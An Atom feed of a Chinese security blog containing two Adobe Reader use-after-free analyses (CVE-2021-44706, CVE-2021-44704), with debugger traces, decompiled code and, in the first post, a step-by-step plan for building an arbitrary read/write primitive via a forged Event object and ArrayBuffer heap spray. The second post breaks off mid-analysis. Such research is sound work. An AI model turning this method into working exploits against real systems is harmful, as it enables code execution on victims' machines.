<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-26T11:34:29+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Joey</title><subtitle>Joey&apos;s blog</subtitle><entry><title type="html">CVE-2021-44706 Adobe Reader UAF漏洞分析与利用</title><link href="http://localhost:4000/2023-05-26/CVE-2021-44706" rel="alternate" type="text/html" title="CVE-2021-44706 Adobe Reader UAF漏洞分析与利用" /><published>2023-05-26T00:00:00+08:00</published><updated>2023-05-26T00:00:00+08:00</updated><id>http://localhost:4000/2023-05-26/CVE-2021-44706</id><content type="html" xml:base="http://localhost:4000/2023-05-26/CVE-2021-44706"><![CDATA[<h1 id="漏洞简介">漏洞简介</h1>

<p>该漏洞也是2021年天府杯中出现的Adobe Reader漏洞，由<a href="https://twitter.com/bee13oy">@bee13oy</a>发现并利用。漏洞位于<code class="language-plaintext highlighter-rouge">EScript.api</code>模块，对应的Adobe Reader版本为：21.007.20099。<!--more--></p>

<h1 id="漏洞原理">漏洞原理</h1>

<p>该漏洞由于递归执行<code class="language-plaintext highlighter-rouge">Collab.registerReview</code>导致原本的通过<code class="language-plaintext highlighter-rouge">Collab.registerApproval</code>注册的事件被更改。被更改后原本的事件对象被释放，但在执行<code class="language-plaintext highlighter-rouge">Collab.registerReview</code>时仍然访问了被释放后的事件对象，造成了UAF。</p>

<p>开启page heap后，调试崩溃于<code class="language-plaintext highlighter-rouge">EScript+0x3E9C0</code>函数内，可以看出由于参数2存放了非法地址导致了崩溃：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=47f72fb8 ebx=30368fc0 ecx=39d14ff0 edx=30368fc0 esi=39d14ff0 edi=4a52afb8
eip=6e5be9d5 esp=00969e4c ebp=00969e50 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
EScript!mozilla::HashBytes+0x2cc85:
6e5be9d5 8b4004          mov     eax,dword ptr [eax+4] ds:002b:47f72fbc=????????

EScript+0x3E9C0：
6e5be9c0 55              push    ebp
6e5be9c1 8bec            mov     ebp,esp
6e5be9c3 56              push    esi
6e5be9c4 8b7508          mov     esi,dword ptr [ebp+8]
6e5be9c7 56              push    esi
6e5be9c8 e8ecfcffff      call    EScript!mozilla::HashBytes+0x2c969 (6e5be6b9)
6e5be9cd 8b450c          mov     eax,dword ptr [ebp+0Ch]
6e5be9d0 59              pop     ecx
6e5be9d1 85c0            test    eax,eax
6e5be9d3 7412            je      EScript!mozilla::HashBytes+0x2cc97 (6e5be9e7)
6e5be9d5 8b4004          mov     eax,dword ptr [eax+4] ds:002b:47f72fbc=????????
</code></pre></div></div>

<p>向前回溯后可知该崩溃地址由父函数的参数3传递：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int *__cdecl fcrash(int a1, __int16 a2, int a3)
{
  int *v3; // esi

  v3 = (int *)sub_1003E5D0(a1, a2);
  crash(v3, a3);    //崩溃函数
  return v3;
}
</code></pre></div></div>

<p>继续向前回溯，发现非法地址ptr是由<code class="language-plaintext highlighter-rouge">sub_10054127</code>产生，参数为<code class="language-plaintext highlighter-rouge">EScript+0x277C60</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *ffcrash()
{
  _DWORD *v0; // edi
  int v1; // esi
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int *v11; // [esp-4h] [ebp-2Ch]
  int ptr; // [esp+18h] [ebp-10h]

  v0 = 0;
  if ( dword_10277C70 )
  {
    v1 = dword_10277C70 - 1;
    v0 = *(_DWORD **)sub_10054127(dword_10277C60);
    v2 = dword_10277C6C;
    if ( !v1 )
      v2 = 0;
    dword_10277C70 = v1;
    dword_10277C6C = v2;
    v3 = sub_100417F0((int)v0);
    sub_1003BDF0(v3);
    if ( dword_10277C70 )
    {
      ptr = *(_DWORD *)sub_10054127(dword_10277C60); //非法地址由该函数产生
    }
    else
    {
      ptr = sub_1003E460(v0, 1);
      sub_1005A465();
    }
    v4 = sub_1003D840(v3);
    sub_1004B200(1);
    v5 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
    sub_10042130(v4, v5, 0);
    v6 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
    sub_10043890(v4, v6, 0);
    sub_1004B210(v4, (wchar_t *)"event");
    v11 = fcrash(v3, 1, ptr);  //崩溃函数的父函数
    v7 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
    sub_1003ED90(v4, v7, v11);
    v8 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
    sub_10042130(v4, v8, 1);
    v9 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
    sub_10043890(v4, v9, 1);
    sub_1004B200(0);
    sub_1003CDD0(v3);
  }
  return v0;
}
</code></pre></div></div>

<p>分析<code class="language-plaintext highlighter-rouge">sub_10054127</code>可以得到被释放的地址<code class="language-plaintext highlighter-rouge">0x47f72fb8</code>，说明该地址被提前释放导致了崩溃的发生：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:10054127 ; int __thiscall sub_10054127(_DWORD *this)
.text:10054127 sub_10054127    proc near               ; CODE XREF: sub_10054110+F↑p
.text:10054127                                         ; ffcrash+21↓p ...
.text:10054127                 push    ebp
.text:10054128                 mov     ebp, esp
.text:1005412A                 push    ecx
.text:1005412B                 push    ecx
.text:1005412C                 push    esi
.text:1005412D                 mov     esi, ecx
.text:1005412F                 mov     eax, [esi+10h]
.text:10054132                 add     eax, [esi+0Ch]
.text:10054135                 lea     edx, [eax-1]
.text:10054138                 mov     eax, [esi+8]
.text:1005413B                 mov     ecx, edx
.text:1005413D                 shr     ecx, 2
.text:10054140                 dec     eax
.text:10054141                 and     ecx, eax
.text:10054143                 mov     eax, [esi+4]
.text:10054146                 and     edx, 3
.text:10054149                 pop     esi
.text:1005414A                 mov     eax, [eax+ecx*4]
.text:1005414D                 lea     eax, [eax+edx*4]
.text:10054150                 leave
.text:10054151                 retn
.text:10054151 sub_10054127    endp

0:000&gt; dd EScript+277c60 L10 //this
6e7f7c60  2fee6ff8 0ea12fe0 00000008 00000000
6e7f7c70  00000002 12e103ff 12e112e2 12dd12dc
6e7f7c80  ffffffff 80000013 00000001 00000000
6e7f7c90  00000000 00000000 00000000 00000000
0:000&gt; dd 0ea12fe0 L10
0ea12fe0  2b840ff0 00000000 00000000 00000000
0ea12ff0  00000000 00000000 00000000 00000000
0ea13000  ???????? ???????? ???????? ????????
0ea13010  ???????? ???????? ???????? ????????
0:000&gt; dd 2b840ff0 L10
2b840ff0  3babafb8 47f72fb8 4a52afb8 c0c0c0c0
2b841000  ???????? ???????? ???????? ????????
2b841010  ???????? ???????? ???????? ????????
2b841020  ???????? ???????? ???????? ????????
0:000&gt; dd 47f72fb8 L10 //ptr
47f72fb8  ???????? ???????? ???????? ????????
47f72fc8  ???????? ???????? ???????? ????????
47f72fd8  ???????? ???????? ???????? ????????
47f72fe8  ???????? ???????? ???????? ????????
</code></pre></div></div>

<p>重新调试，查看崩溃的内存地址是存在的，下断在free函数，设置当free地址为崩溃内存地址时停下，可以确认漏洞触发的原因就是由于提前释放了Event对象导致的非法内存访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:017&gt; dd poi(poi(poi(EScript+277c60 +4))+4)  //崩溃Event对象地址0x1c076fb8，大小为0x48
1c076fb8  36af8fc0 36f24e48 00000000 2f276fb0
1c076fc8  43c3ef80 00000000 00000000 00000000
1c076fd8  00000000 00000000 00000000 00000000
1c076fe8  00000000 6f4cc780 c0c0c000 00000000
1c076ff8  00000000 00000000 ???????? ????????
1c077008  ???????? ???????? ???????? ????????
1c077018  ???????? ???????? ???????? ????????
1c077028  ???????? ???????? ???????? ????????
0:000&gt; da 2f276fb0
2f276fb0  "Event"
0:017&gt; bp ucrtbase!free ".if(poi(esp+4)=0x1c076fb8){}.else{gc}";g
eax=0ea8bd80 ebx=36f24e48 ecx=7545ec00 edx=00002041 esi=7545ec00 edi=1c076fb8
eip=7545ec00 esp=00558fec ebp=00558ff8 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
ucrtbase!free:
7545ec00 8bff            mov     edi,edi
0:000&gt; g  //崩溃的原因为提前释放的0x48大小的Event对象导致
(3d4.b0c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=1c076fb8 ebx=36af8fc0 ecx=694daff0 edx=36af8fc0 esi=694daff0 edi=73742fb8
eip=6f49e9d5 esp=0055a84c ebp=0055a850 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
EScript!mozilla::HashBytes+0x2cc85:
6f49e9d5 8b4004          mov     eax,dword ptr [eax+4] ds:002b:1c076fbc=????????
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<p>此类UAF漏洞的利用步骤都大致相同，分析能否实现越界写或内存释放是关键。本人分析后只找到了实现内存释放的条件，具体的思路如下：</p>

<ol>
  <li>使用0x48大小的无意义字符串占用被释放的Event对象的内存空间</li>
  <li>通过分析后找到了能够实现内存释放的条件，构造特殊字符串用于触发内存释放</li>
  <li>通过堆喷射ArrayBuffer对象实现指定内存地址的占位</li>
  <li>触发漏洞后喷射特殊的字符串触发内存释放，释放堆喷射占位的指定内存地址的ArrayBuffer对象</li>
  <li>释放完毕后立即创建同等大小的字符串占用ArrayBuffer对象的内存，使得ArrayBuffer对象的byteLength为0xffffffff</li>
  <li>通过该任意内存读写原语实现代码执行</li>
</ol>

<h2 id="寻找利用点">寻找利用点</h2>

<p>在漏洞触发的函数中添加释放0x48大小的无意义字符串代码，执行后的效果如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(168.c70): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00949ae8 ebx=41414141 ecx=ecedf400 edx=6fc85690 esi=00000000 edi=00000008
eip=6fb10ff8 esp=00949abc ebp=00949aec iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
EScript!mozilla::HashBytes+0x2f2a8:
6fb10ff8 ff74bb40        push    dword ptr [ebx+edi*4+40h] ds:002b:414141a1=????????
0:000&gt; dd poi(poi(poi(EScript+277c60 +4))+4)
0c964650  41414141 41414141 41414141 41414141
0c964660  41414141 41414141 41414141 41414141
0c964670  41414141 41414141 41414141 41414141
0c964680  41414141 41414141 41414141 41414141
0c964690  41414141 00004141 949c1995 8c021200
0c9646a0  00000000 0c54e0b8 00000000 00000000
0c9646b0  00000000 00000000 00000000 00000000
0c9646c0  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>字符串成功占用被释放的Event对象，在后续读取该对象的数据时发生了内存访问异常，接下来的工作就是分析能否通过构造特殊的字符串实现越界写和内存释放。</p>

<p>查看该函数后可知由于参数1为0x41414141导致后续获取该内存时出错：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __cdecl sub_10040FC4(int a1, char *Str1)
{
  int v2; // esi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  int v7; // [esp+Ch] [ebp-4h] BYREF

  v2 = 0;
  v3 = sub_10003164(Str1, 0x7FFFFFFF, 0);
  v4 = sub_1004067E(Str1, v3, 0xF00F) &amp; 0xF;
  v5 = sub_1004089E(*(_DWORD *)(a1 + 4 * v4), *(_DWORD *)(a1 + 4 * v4 + 0x40), Str1, (int)&amp;v7);// crash
  if ( (_WORD)v7 )
    return *(_DWORD *)(*(_DWORD *)(a1 + 4 * v4) + 8 * v5 + 4);
  return v2;
}
</code></pre></div></div>

<p>继续向上回溯，通过深入分析后在<code class="language-plaintext highlighter-rouge">sub_100461B0</code>找到了内存释放的条件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __cdecl sub_10046150(int a1, char *Str1)
{
  unsigned int v2; // ecx
  int v4; // edi
  int v5; // eax
  unsigned int v7; // [esp-4h] [ebp-Ch]
  unsigned int v8; // [esp-4h] [ebp-Ch]

  v4 = 0;
  while ( a1 )
  {
    if ( *(_DWORD *)(a1 + 0x10) )
    {
      v4 = sub_10040FC4(*(_DWORD *)(a1 + 0x10), Str1);// crash
      v2 = v7;
      if ( v4 )
        return v4;
    }
    else
    {
      v4 = 0;
    }
    if ( !sub_1000279F(v2, Str1, "Dead") )
      break;
    v5 = sub_100461B0((int *)a1, 1);	//深入分析找到内存释放的条件
    v2 = v8;
    a1 = v5;
  }
  return v4;
}
</code></pre></div></div>

<p>该函数位于<code class="language-plaintext highlighter-rouge">sub_100461B0</code>函数的深处，其内部函数<code class="language-plaintext highlighter-rouge">sub_1003D01A</code>调用了free函数释放内存，而该函数的调用需要满足判断条件才会执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __thiscall sub_1003CD44(_DWORD *this)
{
  int v2; // ecx

  v2 = 0x20 - *this;
  if ( this[3] + this[1] &gt;= (unsigned int)(0xC0 * (1 &lt;&lt; v2)) &gt;&gt; 8 )
    return sub_1003D01A(this[3] &lt; (unsigned int)(1 &lt;&lt; v2) &gt;&gt; 2);// free
  else
    return 0;
}
</code></pre></div></div>

<h2 id="构造读写原语">构造读写原语</h2>

<p>经过不断的调试和构造，成功让程序执行到了该处，具体的内存结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; t
eax=20221290 ebx=00000001 ecx=2021018c edx=00000000 esi=00969af8 edi=2021018c
eip=6fb0cd44 esp=00969aa8 ebp=00969ab8 iopl=0         nv up ei ng nz ac pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
EScript!mozilla::HashBytes+0x2aff4:
6fb0cd44 56              push    esi
0:000&gt; dd poi(poi(poi(EScript+277c60 +4))+4) L12 //伪造的Event对象，填充地址为堆喷的指定内存
2dababd8  202100a8 202100d8 00000000 00000000
2dababe8  00000000 00000000 00000000 00000000
2dababf8  00000000 00000000 00000000 00000000
2dabac08  00000000 202100d8 00000000 00000000
2dabac18  00000000 00000000
0:016&gt; dd 20210058 L18	//202100a8所指向的内存结构，防止程序报错
20210058  00000000 00000000 00000000 00000000
20210068  20210078 00000000 00000000 00000000
20210078  00000000 00000000 00000000 00000000
20210088  00000000 00000000 00000000 00000000
20210098  00000000 00000000 00000000 00000000
202100a8  20210068 00000000 00000000 00000000
0:000&gt; dd 202100d8 L34	//202100d8所指向的内存结构，防止程序报错
202100d8  202100e8 00000000 00000000 00000000
202100e8  202100f8 20210108 00000000 00000000
202100f8  00000000 20210118 00000000 00000000
20210108  00000000 00000000 00000000 00000000
20210118  20210118 00000000 00000000 00000000
20210128  00000000 00000000 00000000 00000000
20210138  00000000 00000000 00000000 00000000
20210148  00000000 00000000 00000000 00000000
20210158  00000000 00000000 00000000 00000000
20210168  00000000 00000000 00000000 00000000
20210178  00000000 00000000 00000000 00000000
20210188  00000000 00000018 000000c0 00000000
20210198  00000000 20220048 00000000 00000000
</code></pre></div></div>

<p>此时this指针为<code class="language-plaintext highlighter-rouge">0x2021018C</code>，通过计算后刚好符合执行<code class="language-plaintext highlighter-rouge">sub_1003D01A</code>的条件，该函数最终会释放this[4]所指向的内存：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __thiscall sub_1003D01A(void *this, int a2)
{
  int v3; // esi
  int v4; // esi
  void *v5; // eax
  char v6; // cl
  void *v7; // edx
  _DWORD *v8; // edi
  _DWORD *v9; // esi
  unsigned int *v10; // eax
  size_t v12; // [esp-4h] [ebp-1Ch]
  char v13[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v14; // [esp+Ch] [ebp-Ch]
  void *Block; // [esp+10h] [ebp-8h]
  unsigned int v16; // [esp+14h] [ebp-4h]

  Block = (void *)*((_DWORD *)this + 4);
  v3 = a2 - *(_DWORD *)this;
  v16 = *(_DWORD *)this;
  v4 = v3 + 0x20;
  if ( (unsigned int)(1 &lt;&lt; v4) &gt; 0x1000000 )
    return 2;
  v12 = 1;
  _mm_lfence();
  v5 = calloc(0x18 * (1 &lt;&lt; v4), v12);
  if ( !v5 )
    return 2;
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = v5;
  v6 = 0x20 - v16;
  v7 = Block;
  v8 = Block;
  ++*((_DWORD *)this + 2);
  *(_DWORD *)this = 0x20 - v4;
  v14 = (unsigned int)&amp;v8[6 * (1 &lt;&lt; v6)];
  if ( (unsigned int)v8 &lt; v14 )
  {
    do
    {
      if ( *v8 &gt; 1u )
      {
        v16 = *v8 &amp; 0xFFFFFFFE;
        v9 = (_DWORD *)sub_1001545A(v13, v8 + 2);
        v10 = (unsigned int *)sub_1003F925(v16);
        *v10 = v16;
        sub_1003CD7E(*v9);
      }
      v8 += 6;
    }
    while ( (unsigned int)v8 &lt; v14 );
    v7 = Block;
  }
  free(v7);
  return 1;
}
</code></pre></div></div>

<p>通过上述伪造的Event对象结构成功释放了<code class="language-plaintext highlighter-rouge">0x20220048</code>的ArrayBuffer对象，随后再通过字符串占用被释放的内存，任意内存读写原语构造完毕：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
eax=00000000 ebx=2021018c ecx=00000000 edx=20220048 esi=00969a84 edi=20221848
eip=6fb0d0d0 esp=00969a74 ebp=00969a94 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
EScript!mozilla::HashBytes+0x2b380: //free(v7)
6fb0d0d0 ff154022c86f    call    dword ptr [EScript!double_conversion::DoubleToStringConverter::ToPrecision+0x224d0 (6fc82240)] ds:002b:6fc82240={ucrtbase!free (7545ec00)}
0:000&gt; t
eax=00000000 ebx=2021018c ecx=00000000 edx=20220048 esi=00969a84 edi=20221848
eip=7545ec00 esp=00969a70 ebp=00969a94 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ucrtbase!free:
7545ec00 8bff            mov     edi,edi
0:000&gt; dps esp+4 L1
00969a74  20220048
0:000&gt; dd 20220048	//未被释放的ArrayBuffer对象
20220048  00000000 0000ffe8 00000000 00000000
20220058  00000000 00000000 00000000 00000000
20220068  20210078 00000000 00000000 00000000
20220078  00000000 00000000 00000000 00000000
20220088  00000000 00000000 00000000 00000000
20220098  00000000 00000000 00000000 00000000
202200a8  20210068 00000000 00000000 00000000
202200b8  00000000 00000000 00000000 00000000
0:000&gt; gu
eax=00000001 ebx=2021018c ecx=05010000 edx=05010000 esi=00969a84 edi=20221848
eip=6fb0d0d6 esp=00969a74 ebp=00969a94 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
EScript!mozilla::HashBytes+0x2b386:
6fb0d0d6 59              pop     ecx
0:000&gt; dd 20220048	//被释放后的ArrayBuffer对象
20220048  050100c0 13970fe8 00000000 00000000
20220058  00000000 00000000 00000000 00000000
20220068  20210078 00000000 00000000 00000000
20220078  00000000 00000000 00000000 00000000
20220088  00000000 00000000 00000000 00000000
20220098  00000000 00000000 00000000 00000000
202200a8  20210068 00000000 00000000 00000000
202200b8  00000000 00000000 00000000 00000000
......
//通过字符串占用被释放的内存，byteLength变为0xffffffff，读写原语构造完毕
0:017&gt; dd 20220048
20220048  42424141 ffffffff 00000000 00000000
20220058  00000000 00000000 00000000 00000000
20220068  00000000 00000000 00000000 00000000
20220078  00000000 00000000 00000000 00000000
20220088  00000000 00000000 00000000 00000000
20220098  00000000 00000000 00000000 00000000
202200a8  00000000 00000000 00000000 00000000
202200b8  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>任意地址读写原语构造完毕后，剩下的就是公式化的利用读写原语实现代码执行了，漏洞利用到此结束。</p>

<h1 id="总结">总结</h1>

<p>该漏洞是一个典型的UAF漏洞，通过寻找内存释放的条件最终实现了读写原语的构造。难点一在于寻找内存释放的条件，该函数隐藏在比较深入的地方，必须经过长时间的尝试与分析才能找到这一利用点。难点二在于构造伪造的Event对象，该对象需要符合程序解析的代码，一旦有所偏差程序就会崩溃或进入死循环，需要通过大量的尝试才能稳定利用。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[漏洞简介 该漏洞也是2021年天府杯中出现的Adobe Reader漏洞，由@bee13oy发现并利用。漏洞位于EScript.api模块，对应的Adobe Reader版本为：21.007.20099。]]></summary></entry><entry><title type="html">CVE-2021-44704 Adobe Reader UAF漏洞分析与利用</title><link href="http://localhost:4000/2022-11-24/CVE-2021-44704" rel="alternate" type="text/html" title="CVE-2021-44704 Adobe Reader UAF漏洞分析与利用" /><published>2022-11-24T00:00:00+08:00</published><updated>2022-11-24T00:00:00+08:00</updated><id>http://localhost:4000/2022-11-24/CVE-2021-44704</id><content type="html" xml:base="http://localhost:4000/2022-11-24/CVE-2021-44704"><![CDATA[<h1 id="前言">前言</h1>

<p>该漏洞为2021年天府杯中使用的Adobe Reader UAF漏洞，漏洞位于<code class="language-plaintext highlighter-rouge">Annots.api</code>模块，对应的Adobe Reader版本为：21.007.20099。<!--more--></p>

<h1 id="原理分析">原理分析</h1>

<p>开启pageheap后，打开POC，崩溃于<code class="language-plaintext highlighter-rouge">Annots+6aabb</code>处：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
(18b8.136c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=04afc5fc ebx=4ac2cffc ecx=567e8fa0 edx=04afc574 esi=57536ff4 edi=567e8fa0
eip=6c55aabb esp=04afc5e8 ebp=04afc608 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
Annots!PlugInMain+0x4cc8b:
6c55aabb 8b772c          mov     esi,dword ptr [edi+2Ch] ds:002b:567e8fcc=????????
0:000&gt; k
 # ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
00 04afc608 6c5bebd8 Annots!PlugInMain+0x4cc8b
01 04afc640 6c5bc872 Annots!PlugInMain+0xb0da8
02 04afc714 6c5bed43 Annots!PlugInMain+0xaea42
03 04afc72c 6cdf3f47 Annots!PlugInMain+0xb0f13
04 04afc870 6cdd86ff EScript!mozilla::HashBytes+0x421f7
05 04afc8e4 6cdd3495 EScript!mozilla::HashBytes+0x269af
06 04afcd50 6cdd23eb EScript!mozilla::HashBytes+0x21745
07 04afcd94 6cdd22fb EScript!mozilla::HashBytes+0x2069b
08 04afcdd0 6cdd2230 EScript!mozilla::HashBytes+0x205ab
09 04afce04 6cdbb630 EScript!mozilla::HashBytes+0x204e0
0a 04afce54 6cdfa956 EScript!mozilla::HashBytes+0x98e0
0b 04afced8 6cdfa65b EScript!mozilla::HashBytes+0x48c06
0c 04afd08c 6cdf9fd6 EScript!mozilla::HashBytes+0x4890b
0d 04afd0d8 6cdf8db3 EScript!mozilla::HashBytes+0x48286
0e 04afd178 6ce76ebf EScript!mozilla::HashBytes+0x47063
......
</code></pre></div></div>

<p>查看该函数可以明显看到由于this指针指向了非法地址导致：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *__thiscall sub_2216AAAD(int this)
{
  _DWORD *v2; // esi

  v2 = *(_DWORD **)(this + 0x2C);	//crash		
  if ( !v2 )
  {
    v2 = (_DWORD *)alloc_0((wchar_t *)this, 0xC, 1);
    if ( v2 )
    {
      *v2 = 0;
      v2[1] = 0;
      *v2 = sub_221234C9(v2);		// 初始化v2
    }
    else
    {
      v2 = 0;
    }
    *(_DWORD *)(this + 0x2C) = v2;
  }
  return v2;
}
</code></pre></div></div>

<p>于是向上回溯找到了漏洞函数<code class="language-plaintext highlighter-rouge">Annots+CC5EA</code>，该函数获取了指向非法地址的this指针：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__int16 __thiscall sub_221CC5EA(void *this, wchar_t *a2, wchar_t *a3, int a4)
{
  v19[2] = (uintptr_t)this;
  v24 = (wchar_t *)a4;
  v27 = a3;
  v4 = (wchar_t *)(*(int (__cdecl **)(wchar_t *))(vtable + 0xF4))(a3);// v4 = *a3
  v26 = (wchar_t *)0xFFFFFFFF;
......	//省略无关函数
  if ( (int)v26 &gt;= 0 )
    sub_2226B498((void *)dword_22748BEC, v6, v26, (int)&amp;object, v28, v30 != 0, v29);// 获取Annotation对象，存储于object
  else
    sub_221599FC((char)v6, &amp;object, v28, v30 != 0, v29);
  if ( (unsigned int)((char *)object_end - (char *)object) &lt; 4 )
  {
    (*(void (__cdecl **)(wchar_t *, _DWORD))(vtable + 0x80))(v24, 0);
  }
  else
  {
    addr = (wchar_t *)(*(int (__cdecl **)(unsigned int))(dword_22747444 + 4))(((char *)object_end - (char *)object) &amp; 0xFFFFFFFC);	// malloc object size
    v10 = (int *)object;
    v11 = addr;
    v12 = object_end;
    v27 = addr;
    if ( object != object_end )
    {
      do
      {
        v13 = vtable;
        v14 = sub_221CEBB7(v25, *v10, 0);       // 崩溃函数的上层函数，v10存储的正是this指针
        *(_DWORD *)v11 = (*(int (__thiscall **)(_DWORD, wchar_t *, int, int))(v13 + 0x40))(
                           *(_DWORD *)(v13 + 0x40),
                           v25,
                           1,
                           v14);
        ++v10;
        v12 = object_end;
        v11 += 2;
      }
      while ( v10 != (int *)object_end );
      v10 = (int *)object;
      v11 = v27;
    }
......	//省略无关函数
}
</code></pre></div></div>

<p>在调试器中可以更清晰的看到该函数通过<code class="language-plaintext highlighter-rouge">sub_2226B498</code>获取Annotation对象的过程：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
Breakpoint 1 hit
eax=0536d704 ebx=2c916bd0 ecx=2bea8ef0 edx=00104004 esi=00000000 edi=57d4afb8
eip=6e9cc80e esp=0536d6cc ebp=0536d7a4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
Annots!PlugInMain+0xae9de:
6e9cc80e e885ec0900      call    Annots!PlugInMain+0x14d668 (6ea6b498)	//获取Annotation对象
0:000&gt; dps esp L6
0536d6cc  2c916bd0
0536d6d0  00000000
0536d6d4  0536d704		//该处存放获取的Annotation对象
0536d6d8  00000000
0536d6dc  00000000
0536d6e0  00000008
0:000&gt; dd 0536d704 L4	//未获取前为空
0536d704  00000000 00000000 00000000 3b2c7800
0:000&gt; p
eax=00000002 ebx=2c916bd0 ecx=6ea6b691 edx=00000003 esi=00000000 edi=57d4afb8
eip=6e9cc813 esp=0536d6e4 ebp=0536d7a4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
Annots!PlugInMain+0xae9e3:
6e9cc813 8b8564ffffff    mov     eax,dword ptr [ebp-9Ch] ss:002b:0536d708=6b5c4ff8
0:000&gt; dd 0536d704 L4	//获取到0xC大小的存放Annotation对象指针的结构
0536d704  6b5c4ff0 6b5c4ff8 6b5c5000 3b2c7800
0:000&gt; dd 6b5c4ff0 L4	//该结构存放了两个Annotation对象
6b5c4ff0  809b4fa0 64cfafa0 00000000 00000000
0:000&gt; dd 809b4fa0 L18	//Annots[0]，name:aaa
809b4fa0  6ee3616c 00000000 00000000 00000001
809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
809b4fd0  00000000 00000000 00000000 00000000
809b4fe0  00000000 00000000 00000000 00000000
809b4ff0  00000000 00000000 00000000 00000000
0:000&gt; dd 64cfafa0 L18	//Annots[1]，name:bbb
64cfafa0  6ee3616c 00000000 00000000 00000001
64cfafb0  00000000 8034cfb0 80d48ff8 80d48ffc
64cfafc0  80d48ffc 00000000 00000000 8bdc0ff0
64cfafd0  00000000 00000000 00000000 00000000
64cfafe0  00000000 00000000 00000000 00000000
64cfaff0  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>每个Annotation对象的大小均为0x60，随后将Annots[0]对象的指针传入<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
Breakpoint 2 hit
eax=85de8ff8 ebx=85de8ff8 ecx=55ae2ff8 edx=01000002 esi=6b5c4ff0 edi=24d74c98
eip=6e9cc86d esp=0536d6d8 ebp=0536d7a4 iopl=0         nv up ei ng nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000293
Annots!PlugInMain+0xaea3d:
6e9cc86d e845230000      call    Annots!PlugInMain+0xb0d87 (6e9cebb7)	//sub_221CEBB7，崩溃函数的上层函数
0:000&gt; dps esp L3
0536d6d8  2f8e8fc0
0536d6dc  809b4fa0		//此时传入的参数正是Annots[0]对象的指针
0536d6e0  00000000
</code></pre></div></div>

